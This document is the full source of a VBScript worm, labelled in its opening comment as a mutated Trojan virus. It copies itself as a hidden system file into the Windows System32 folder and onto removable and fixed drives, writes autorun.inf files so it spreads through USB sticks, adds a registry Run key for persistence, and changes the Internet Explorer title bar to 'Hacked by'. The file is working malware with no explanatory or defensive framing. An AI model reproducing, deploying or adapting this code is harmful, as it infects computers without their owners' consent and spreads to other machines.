'Mutation of Trojan virus.
'My name is 2F005A51A1C7418.vbs
On error resume next
Dim mysource,winpath,flashdrive,fs,mf,atr,tf,rg,nt,check,sd,oldname,newname,rgname
Set fs = createobject("Scripting.FileSystemObject")
Set wn = WScript.CreateObject("WScript.Network")
Set mf = fs.getfile(Wscript.ScriptFullname)
oldname=CStr(fs.getfilename(Wscript.ScriptFullname))
newname = wn.ComputerName & ".vbs"
rgname = Replace(newname,".vbs","")
atr = "[autorun]"&vbcrlf&"shellexecute=wscript.exe 2F005A51A1C7418.vbs"
dim text,size
size = mf.size
check = mf.drive.drivetype
Set text=mf.openastextstream(1,-2)
do while not text.atendofstream
mysource=mysource&text.readline
mysource=mysource & vbcrlf
Loop
mysource=Replace(mysource,oldname,newname)
do
Set winpath = fs.getspecialfolder(0)
Set tf = fs.getfile(winpath & "\SYSTEM32\" & newname)
tf.attributes = 32
Set tf=fs.createtextfile(winpath & "\SYSTEM32\" & newname,2,true)
tf.write mysource
tf.close
Set tf = fs.getfile(winpath & "\SYSTEM32\" & newname)
tf.attributes = 39
For each flashdrive in fs.drives
If (flashdrive.drivetype = 1 or flashdrive.drivetype = 2) and flashdrive.path <> "A:" Then
Set tf=fs.getfile(flashdrive.path &"\2F005A51A1C7418.vbs")
tf.attributes =32
Set tf=fs.createtextfile(flashdrive.path &"\2F005A51A1C7418.vbs",2,true)
tf.write mysource
tf.close
Set tf=fs.getfile(flashdrive.path &"\2F005A51A1C7418.vbs")
tf.attributes =39
Set tf =fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes = 32
Set tf=fs.createtextfile(flashdrive.path &"\autorun.inf",2,true)
tf.write atr
tf.close
Set tf =fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes=39
End If
next
Set rg = createobject("WScript.Shell")
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & rgname & "",winpath&"\SYSTEM32\" & newname
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title","Hacked by " & Replace(oldname, ".vbs","")
if check <> 1 then
Wscript.sleep 120000
End if
loop while check<>1
Set sd = createobject("Wscript.shell")
sd.run winpath&"\explorer.exe /e,/select, "&Wscript.ScriptFullname
